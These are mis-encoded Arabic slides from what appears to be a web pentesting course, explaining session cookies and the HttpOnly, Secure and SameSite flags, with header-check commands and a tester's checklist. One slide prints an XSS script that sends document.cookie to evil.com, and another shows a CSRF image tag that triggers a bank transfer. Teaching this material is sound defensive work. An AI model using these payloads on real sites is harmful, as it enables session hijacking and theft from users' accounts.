## ๐ Slide 72: ุนููุงู ุงููุณู - Cookies & Cookie Parameters
### Cookies & Cookie Parameters

ุฏูููุชู ูุฏุฎู ูู **ุงูุชูุงุตูู ุงูุชูููุฉ ุงูุฏูููุฉ** ุจุชุงุนุฉ ุงูู Cookies ููุนุงููุงุชูุง.

ุงูุฌุฒุก ุฏู ูู ุงููู ููุฎููู **Pentester ูุญุชุฑู** ูู ุงุฎุชุจุงุฑ ุงูู Sessions. ูุฃูู ูุชุนุฑู ุจุงูุธุจุท ุชุจุต ุนูู ุฅูู ูุชุฏูุฑ ุนูู ุฅูู!

---

## ๐ Slide 73: ุชุนุฑูู ุงูู Cookies
### What Are Cookies?

### ุงูุชุนุฑูู:
> **ุงูู Cookies** ูู ูุทุน ุตุบูุฑุฉ ูู ุงูุจูุงูุงุช ุจูุฎุฒููุง **ุงููุชุตูุญ** (ูุด ุงูุณูุฑูุฑ!) ุนูู ุฌูุงุฒ ุงููุณุชุฎุฏู. ุงูููุงูุน ุงููู ุจุฒูุฑูุง ูู ุงููู ุจุชุทูุจ ูู ุงููุชุตูุญ ูุฎุฒููุง.

### ููู ุงุณููุง "ููููุฒ" (ุจุณูููุช)ุ ๐ช
ุงูุงุณู ุฌู ูู ูุตุทูุญ ูุฏูู ูู ุงูุจุฑูุฌุฉ ุงุณูู "Magic Cookie" ูุงููู ูู ุนุจุงุฑุฉ ุนู ูุทุนุฉ ุจูุงูุงุช ุตุบูุฑุฉ ุจุชุชุนุฏู ุจูู ุงูุจุฑุงูุฌ. ุชุฎูู ูุฏู ุฅูู ุจุชูุฒุน ุจุณูููุชุฉ ุนูู ูู ุญุฏ ูุฒูุฑู ุนุดุงู ููุง ูุฑุฌุน ุชุงูู ุชุนุฑูู ูู ุงูุจุณูููุชุฉ! ๐

### ุงุณุชุฎุฏุงูุงุชูุง ุงูุฃุณุงุณูุฉ:
1. **ุฅุฏุงุฑุฉ ุงูุฌูุณุงุช** โ ุชุฎุฒูู ุงูู Session ID (ุฏู ุงููู ููููุง!)
2. **ุงูุชูุถููุงุช** โ ุงููุบุฉ ุงูููุถูุฉุ ุงูุซูู (Dark/Light)
3. **ุงูุชุชุจุน** โ Cookies ุงูุฅุนูุงูุงุช (Google Analytics, Facebook Pixel)

### ุฃููุงุน ุงูู Cookies:
```
Session Cookies (ูุคูุชุฉ):
โโโ ุจุชุชูุณุญ ููุง ุชููู ุงููุชุตูุญ
โโโ ููููุงุด Expiration Date
โโโ ุจุชูุณุชุฎุฏู ููู Session Management

Persistent Cookies (ุฏุงุฆูุฉ):
โโโ ุจุชูุถู ููุฌูุฏุฉ ููุชุฑุฉ ูุญุฏุฏุฉ
โโโ ูููุง Expiration Date ุฃู Max-Age
โโโ ุจุชูุณุชุฎุฏู ููู "Remember Me"

Third-Party Cookies (ุทุฑู ุชุงูุช):
โโโ ูู ููุงูุน ุชุงููุฉ ุบูุฑ ุงููู ุฃูุช ุนููู
โโโ ุจุชูุณุชุฎุฏู ูู ุงูุฅุนูุงูุงุช ูุงูุชุชุจุน
โโโ ูุชูุฑ ูู ุงููุชุตูุญุงุช ุจุฏุฃุช ุชููุนูุง
```

---

## ๐ Slide 74: ุฏูุฑ ุงูู Cookies ูู ุฅุฏุงุฑุฉ ุงูุฌูุณุงุช
### How Cookies Are Used in Session Management

### ุงูุฑุญูุฉ ุงููุงููุฉ ูู Login ูุญุฏ Logout:

```
Step 1: ุงููุณุชุฎุฏู ุจูุณุฌู ุฏุฎูู
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username=ahmed&password=MyP@ssw0rd

Step 2: ุงูุณูุฑูุฑ ุจูุชุญูู ูุจูุนูู Session ูุจูุจุนุช Cookie
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=k8x92mPqL4wN7bR3; Path=/; HttpOnly; Secure
Location: /dashboard

Step 3: ุงููุชุตูุญ ุจูุฎุฒู ุงูู Cookie ููุจุนุชูุง ูุน ูู Request
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
GET /dashboard HTTP/1.1
Cookie: PHPSESSID=k8x92mPqL4wN7bR3

GET /profile HTTP/1.1
Cookie: PHPSESSID=k8x92mPqL4wN7bR3

POST /transfer HTTP/1.1
Cookie: PHPSESSID=k8x92mPqL4wN7bR3

Step 4: ุงููุณุชุฎุฏู ุจูุนูู Logout
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
POST /logout HTTP/1.1
Cookie: PHPSESSID=k8x92mPqL4wN7bR3

ุงูุณูุฑูุฑ ุจููุณุญ ุงูู Session ูู ุนูุฏู
ูุจูุจุนุช Cookie ูุงุฑุบุฉ ูููุชุตูุญ:
Set-Cookie: PHPSESSID=; Expires=Thu, 01 Jan 1970; Path=/
```

### ุฅูู ุงููู ุจุชุญุชูุธ ุจูู ุงูู Cookieุ
ุงูู Cookie **ูุด ุจุชุฎุฒู ุจูุงูุงุชู ุงูุดุฎุตูุฉ**! ูู ุจุชุฎุฒู **ุงูู Session ID ุจุณ** - ูุงููู ูู ุนุจุงุฑุฉ ุนู ุฑูู ุนุดูุงุฆู. ุงูุจูุงูุงุช ุงููุนููุฉ (ุงุณููุ ุตูุงุญูุงุชูุ ุงูู Shopping Cart) **ูุฎุฒูุฉ ุนูู ุงูุณูุฑูุฑ** ููุฑุจูุทุฉ ุจุงูู Session ID ุฏู.

> **๐ด ุซุบุฑุฉ ุดุงุฆุนุฉ:** ุจุนุถ ุงูููุงูุน ุจุชุฎุฒู **ุจูุงูุงุช ุญููููุฉ** ูู ุงูู Cookie ุจุฏู Session ID:
> ```
> Cookie: user=ahmed; role=admin; balance=5000
> ```
> ุงููุดููุฉ ูุงุถุญุฉ: ุงููุณุชุฎุฏู ููุฏุฑ ูุบูุฑ ุงูู Cookie ููุฎูู `role=superadmin` ุฃู `balance=999999`! ุนุดุงู ูุฏู ุฏุงููุงู ูุงุฒู ุงูู Cookie ุชุญุชูู ุนูู **Session ID ููุท** ูุงูุจูุงูุงุช ุงูุญููููุฉ ุชููู ุนูู ุงูุณูุฑูุฑ!

---

## ๐ Slide 75: ูุนุงูู HttpOnly
### Cookie Parameters: HttpOnly

### ุงููุดููุฉ ุงููู ุจูุญููุง:
**ูุฌูุงุช ุงูู Cross-Site Scripting (XSS)**

ููุง ูููุน ูููู ููู ุซุบุฑุฉ XSSุ ุงูููุงุฌู ููุฏุฑ ูุญูู ููุฏ JavaScript ูู ุงูุตูุญุฉ. ุงูููุฏ ุฏู ููุฏุฑ ููุฑุฃ ุงูู Cookies ููุจุนุชูุง ููููุงุฌู!

**ุจุฏูู HttpOnly:**
```javascript
// ุงูููุงุฌู ุจูุญูู ุงูููุฏ ุฏู ูู ุตูุญุฉ ูููุง ุซุบุฑุฉ XSS:
<script>
  // ุจููุฑุฃ ูู ุงูู Cookies
  var stolen = document.cookie;
  // cookie = "PHPSESSID=k8x92mPqL4wN7bR3; theme=dark"
  
  // ุจูุจุนุชูุง ูุณูุฑูุฑ ุงูููุงุฌู
  fetch("https://evil.com/steal?cookies=" + encodeURIComponent(stolen));
  
  // ุฃู ุจุทุฑููุฉ ุชุงููุฉ:
  new Image().src = "https://evil.com/steal?c=" + document.cookie;
</script>

// ุงููุชูุฌุฉ: ุงูููุงุฌู ุนูุฏู ุงูู Session ID ุจุชุงุนู! ๐
```

### ุงูุญู: HttpOnly Flag

```http
Set-Cookie: PHPSESSID=k8x92mPqL4wN7bR3; HttpOnly
```

**ููุง ุชุญุท `HttpOnly`:**
- โ ุงููุชุตูุญ **ุจูุฎุฒู** ุงูู Cookie โ ุนุงุฏู
- โ ุงููุชุตูุญ **ุจูุจุนุชูุง** ููุณูุฑูุฑ ูุน ูู Request โ ุนุงุฏู
- โ **JavaScript** ูุด ุจููุฏุฑ ููุฑุฃูุง ุฎุงูุต! โ `document.cookie` ูุด ูุชุฑุฌุน ุงูู Cookie ุฏู!

```javascript
// ูุน HttpOnlyุ ูู ุงูููุงุฌู ุฌุฑุจ:
console.log(document.cookie);
// ุงููุชูุฌุฉ: "theme=dark"  โ ุงูู PHPSESSID ูุด ุธุงูุฑ!
// ุงูู HttpOnly Cookies ูุฎููุฉ ุชูุงูุงู ุนู JavaScript!
```

> **๐ด ูู ูุงูุน ุงูู Pentesting - ุฅุฒุงู ุจุชุฎุชุจุฑูุง:**
> ```
> 1. ุงูุชุญ DevTools ูู ุงููุชุตูุญ (F12)
> 2. ุฑูุญ ุนูู ุชุงุจ Application โ Cookies
> 3. ุดูู ุนููุฏ "HttpOnly"
> 4. ูู ููู โ (ุนูุงูุฉ ุตุญ) โ ุงููููุน ูุชุฃูููู โ
> 5. ูู ูููุด โ Finding! ุงูู Cookie ูุงุจูุฉ ููุณุฑูุฉ ุนุจุฑ XSS! โ
>
> ุฃู ูู Burp Suite:
> ุดูู ุงูู Set-Cookie header - ูู ูููุด ูููุฉ "HttpOnly" = ุซุบุฑุฉ!
> ```

---

## ๐ Slide 76: ูุนุงูู Secure
### Cookie Parameters: Secure

### ุงููุดููุฉ ุงููู ุจูุญููุง:
**ูุฌูุงุช ุงูู Man-in-the-Middle (MitM) ูุงุนุชุฑุงุถ ุงูุดุจูุฉ**

ุงูู Cookies ุจุดูู ุงูุชุฑุงุถู ุจุชุชุจุนุช ูุน **ุฃู Request** - ุณูุงุก ูุงู ุนูู HTTP (ุบูุฑ ูุดูุฑ) ุฃู HTTPS (ูุดูุฑ).

**ุชุฎูู ุงูุณููุงุฑูู ุฏู:**
```
ุฃุญูุฏ ูุงุนุฏ ูู ูุงููู ุจูุณุชุฎุฏู WiFi ููุชูุญ.
ุงูููุงุฌู ุนูู ููุณ ุงูุดุจูุฉ ุจูุณุชุฎุฏู ุฃุฏุงุฉ ุฒู Wireshark.

1. ุฃุญูุฏ ุจููุชุญ https://bank.com/login (ูุดูุฑ โ OK)
2. ุฃุญูุฏ ุจูุณุฌู ุฏุฎูู โ ุจูุงุฎุฏ Session Cookie
3. ุฃุญูุฏ ุจุงูุตุฏูุฉ ุจููุชุญ http://bank.com/page (HTTP!)
4. ุงููุชุตูุญ ุจูุจุนุช ุงูู Cookie ูุน ุงูู HTTP Request
5. ุงูููุงุฌู ุจูุนุชุฑุถ ุงูู Request โ ุจูุดูู ุงูู Cookie! ๐
6. ุงูููุงุฌู ุจูุณุชุฎุฏู ุงูู Cookie โ ุจูุฏุฎู ุญุณุงุจ ุฃุญูุฏ ูู ุงูุจูู!
```

ุฏู ุงุณูู **Session Sidejacking** ูุฏู ูุงู ุฃุณุงุณ ุฃุฏุงุฉ **Firesheep** ุงูุดููุฑุฉ ุงููู ูู 2010 ุฎูุช ูุงุณ ุชูุฏุฑ ุชุณุฑู ุฌูุณุงุช Facebook ู Twitter ูู ุงููุงูููุงุช!

### ุงูุญู: Secure Flag

```http
Set-Cookie: PHPSESSID=k8x92mPqL4wN7bR3; Secure
```

**ููุง ุชุญุท `Secure`:**
- โ ุงูู Cookie **ุจุชุชุจุนุช ุนูู HTTPS ููุท** (ูุดูุฑุฉ)
- โ ุงูู Cookie **ูุด ูุชุชุจุนุช ุฃุจุฏุงู ุนูู HTTP** (ุญุชู ูู ุงููุณุชุฎุฏู ูุชุญ ุงููููุน ุจู HTTP ุจุงูุตุฏูุฉ)
- ุญุชู ูู ุงูููุงุฌู ุจูุนุชุฑุถ ุงูู Traffic ุนูู ุงูุดุจูุฉุ ูุด ููุดูู ุงูู Cookie ูุฃููุง ูุดูุฑุฉ!

> **๐ด ูู ูุงูุน ุงูู Pentesting - ููููุฉ ุงูุงุฎุชุจุงุฑ:**
> ```bash
> # ุงูุทุฑููุฉ 1: ูู Burp Suite
> # ุดูู ุงูู Set-Cookie header โ ูู ูููุด "Secure" = Finding!
> 
> # ุงูุทุฑููุฉ 2: ุจุงุณุชุฎุฏุงู curl
> curl -I https://target.com/login -v 2>&1 | grep -i "set-cookie"
> # ุดูู ูู ููู Secure flag ููุง ูุฃ
> 
> # ุงูุทุฑููุฉ 3: ูู DevTools
> # Application โ Cookies โ ุนููุฏ "Secure" โ โ ููุง ูุฃ
> ```
>
> **ููุงุญุธุฉ ูููุฉ:** ุญุชู ูู ุงููููุน ููู HTTPSุ ูู ุงูู Cookie ููููุงุด `Secure` Flagุ ูููู ุงูููุงุฌู ูุนูู **SSL Strip** ููุฎูู ุงููุณุชุฎุฏู ูุชุตู ุจู HTTP โ ููุณุฑู ุงูู Cookie!

---

## ๐ Slide 77: ูุนุงูู SameSite
### Cookie Parameters: SameSite

### ุงููุดููุฉ ุงููู ุจูุญููุง:
**ูุฌูุงุช ุงูู Cross-Site Request Forgery (CSRF)**

### ูุนูู ุฅูู CSRF ุจุจุณุงุทุฉุ

```
ุงูุณููุงุฑูู:
1. ุฃุญูุฏ ูุณุฌู ุฏุฎูู ูู ูููุน ุงูุจูู (bank.com)
   ุงูู Session Cookie ููุฌูุฏุฉ ูู ูุชุตูุญู

2. ุฃุญูุฏ ุจููุชุญ ุฅูููู ููู ูููู ููููุน ุฎุจูุซ (evil.com)

3. ุงููููุน ุงูุฎุจูุซ ููู ููุฏ ูุฎูู:
   <img src="https://bank.com/transfer?to=hacker&amount=10000">

4. ุงููุชุตูุญ ุจุชุงุนุฃุญูุฏ ุจูุจุนุช ุงูุทูุจ ุฏู ูู bank.com
   ููุนุงู ุงูู Session Cookie ุชููุงุฆูุงู! (ูุฃู ุงููุชุตูุญ ุจูุจุนุช Cookies ูุน ูู Request ูููููุน ุตุงุญุจูุง)

5. ุงูุจูู ุจูุดูู ุงูู Session Cookie ุงูุตุญูุญุฉ โ ุจูููุฐ ุงูุชุญููู!
   ุงูููุงุฌู ูุณุจ 10,000 ุฌููู! ๐
```

### ุงูุญู: SameSite Attribute

ุจูุชุญูู ูู **ุฅูุชู** ุงููุชุตูุญ ูุจุนุช ุงูู Cookie ูุน ุงูุทูุจุงุช ุงููู ุฌุงูุฉ ูู ููุงูุน ุชุงููุฉ (Cross-Site Requests).

### ุงูููู ุงูุซูุงุซุฉ:

#### ๐ด `SameSite=Strict` (ุงูุฃูุซุฑ ุฃูุงูุงู)
```http
Set-Cookie: session=abc123; SameSite=Strict
```
- ุงูู Cookie **ูุง ุชูุฑุณู ุฃุจุฏุงู** ูุน ุฃู ุทูุจ ุฌุงู ูู ูููุน ุชุงูู
- ุญุชู ูู ุถุบุทุช ูููู ูู ุฅูููู ุฃู ููุณุจูู ููุฏูู ูููููุน โ ุงูู Cookie ูุด ูุชุชุจุนุช โ ูุชูุงูู ููุณู ูุด ูุณุฌู ุฏุฎูู!

**ุงูููุฒุฉ:** ุญูุงูุฉ ูุงููุฉ ูู CSRF โ
**ุงูุนูุจ:** ุชุฌุฑุจุฉ ูุณุชุฎุฏู ุณูุฆุฉ - ูู ูุง ุชูุฌู ูู ูููุน ุชุงูู ูุงุฒู ุชุณุฌู ุฏุฎูู ุชุงูู ๐ค

#### ๐ก `SameSite=Lax` (ุงูุชูุงุฒู ุงููุซุงูู - Default ุญุงููุงู)
```http
Set-Cookie: session=abc123; SameSite=Lax
```
- ุงูู Cookie **ุจุชุชุจุนุช** ูุน Navigation (ููููุงุช ุจุชูููู ูููููุน - Top-Level GET Requests)
- ุงูู Cookie **ูุด ุจุชุชุจุนุช** ูุน Background Requests (Images, iFrames, POST Forms)

**ูุนูู ุนูููุงู:**
```
โ ุถุบุทุช ูููู ูู ุฅูููู ููุฏูู ููุจูู โ Cookie ุจุชุชุจุนุช โ ูุณุฌู ุฏุฎูู
โ ูููุน ุฎุจูุซ ุญุงูู ูุจุนุช POST Request ููุจูู โ Cookie ูุด ุจุชุชุจุนุช โ CSRF ูุดู!
โ ูููุน ุฎุจูุซ ุญุงุท <img src="bank.com/transfer"> โ Cookie ูุด ุจุชุชุจุนุช โ ูุดู!
```

**ุฏู ุฃุญุณู ุชูุงุฒู ุจูู ุงูุฃูุงู ูุชุฌุฑุจุฉ ุงููุณุชุฎุฏู!** ๐

#### โช `SameSite=None` (ูููุด ุญูุงูุฉ)
```http
Set-Cookie: session=abc123; SameSite=None; Secure
```
- ุงูู Cookie **ุจุชุชุจุนุช ูุน ุฃู ุทูุจ** - ุณูุงุก ูู ููุณ ุงููููุน ุฃู ูู ูููุน ุชุงูู
- **ูุงุฒู** ูููู ูุนุงูุง `Secure` Flag (ููุท ุนูู HTTPS)
- ุฏู ููุณ ุงูุณููู ุงููุฏูู ูุจู ูุง ูุฎุชุฑุนูุง SameSite

**ุจููุณุชุฎุฏู ููุง ูููู ุถุฑูุฑู:** ูุซูุงู SSO, Payment Gateways, Third-Party Widgets.

> **๐ด ูู ูุงูุน ุงูู Pentesting - ุงูู Checklist:**
> ```
> ููุง ุชุดูู Set-Cookie Headerุ ุงุณุฃู 3 ุฃุณุฆูุฉ:
> 
> โ ููู HttpOnly? โ ูู ูุฃ = XSS ููุฏุฑ ูุณุฑู ุงูู Session
> โ ููู Secure?   โ ูู ูุฃ = MitM ููุฏุฑ ูุนุชุฑุถ ุงูู Cookie  
> โ ููู SameSite? โ ูู ูุฃ ุฃู None = CSRF ูููู
> 
> ูุซุงู ูู Cookie ูุซุงููุฉ:
> Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/
> 
> ูุซุงู ูู Cookie ูุงุฑุซูุฉ:
> Set-Cookie: session=abc
> (ูููุด ุฃู Flag!) โ 3 Findings ูู ุณุทุฑ ูุงุญุฏ! ๐ฏ
> ```
>
> **ุฃุฏุงุฉ ูููุฏุฉ:** ูู ุนุงูุฒ ุชูุญุต Cookies ููููุน ุจุณุฑุนุฉ:
> ```bash
> curl -I -s https://target.com/ | grep -i set-cookie
> ```

---

## ๐ฏ ููุฎุต ุงูุฌูุณุฉ ุงูุฎุงูุณุฉ

| ุงูููููู | ุงูุดุฑุญ | ููู ููู ูู Pentesting |
|---------|-------|-----------------------|
| **Session Management** | ูุธุงู "ุฐุงูุฑุฉ" ููุณูุฑูุฑ ุนุดุงู HTTP Stateless | ูู ุงููุฌูุงุช ุงูุฌุงูุฉ ูุจููุฉ ุนููู |
| **Session ID** | ุฑูู ูุฑูุฏ ุจูุฑุจุทู ุจุจูุงูุงุชู ุนูู ุงูุณูุฑูุฑ | "ููู ูููู ุงูู ID ูููู ุงูุฌูุณุฉ!" |
| **Cookie-Based** | ุงูุฃุดูุฑ ูุงูุฃุฃูู (ูุน Flags) | ุงูุทุฑููุฉ ุงููุนูุงุฑูุฉ |
| **URL-Based** | ุฎุทูุฑ - ุงูู ID ุธุงูุฑ ูู ุงูุฑุงุจุท | Finding ููุฑู ูู ูููุชูุง |
| **Token-Based (JWT)** | Stateless - ุงูุจูุงูุงุช ูู ุงูู Token | ูููุง ุซุบุฑุงุช ูุฎุชููุฉ (ููุดูููุง) |
| **HttpOnly** | ุจุชููุน JavaScript ูู ูุฑุงุกุฉ ุงูู Cookie | ุญูุงูุฉ ูู XSS-based Session Theft |
| **Secure** | ุจุชููุน ุฅุฑุณุงู ุงูู Cookie ุนูู HTTP | ุญูุงูุฉ ูู MitM/Sniffing |
| **SameSite** | ุจุชุชุญูู ูู ุฅุฑุณุงู ุงูู Cookie Cross-Site | ุญูุงูุฉ ูู CSRF |

### ๐ง ุงูู Checklist ุงูุณุฑูุนุฉ (ุงุณุชุฎุฏููุง ูู ูู Pentest):
```
โก ุงูู Session ID ุทููู ูุนุดูุงุฆูุ
โก ุงูู Session ID ุจูุชุบูุฑ ุจุนุฏ Login (Session Regeneration)ุ
โก ุงูู Cookie ุนูููุง HttpOnlyุ
โก ุงูู Cookie ุนูููุง Secureุ
โก ุงูู Cookie ุนูููุง SameSite (Lax ุฃู Strict)ุ
โก ุงูู Session ุจุชูุชูู ุจุนุฏ Timeoutุ
โก ุงูู Logout ุจูุฏูุฑ ุงูู Session ุนูู ุงูุณูุฑูุฑุ
โก ุงูู Session ID ูุด ูู ุงูู URLุ
```

> **๐ ุงูุฌูุณุฉ ุงูุฌุงูุฉ:** ููุชููู ุนู **Expiration/Max-Age** ูุงูุฃูุซูุฉ ุงูุนูููุฉ ุซู ูุฏุฎู ูู **Cookie Tampering** - ุฅุฒุงู ูุบูุฑ ููู ุงูู Cookies ุนุดุงู ูุณุฑู ุญุณุงุจุงุช ุฃู ูุฑูุน ุตูุงุญูุงุชูุง! ุฌูุฒ Burp Suite! ๐๏ธ
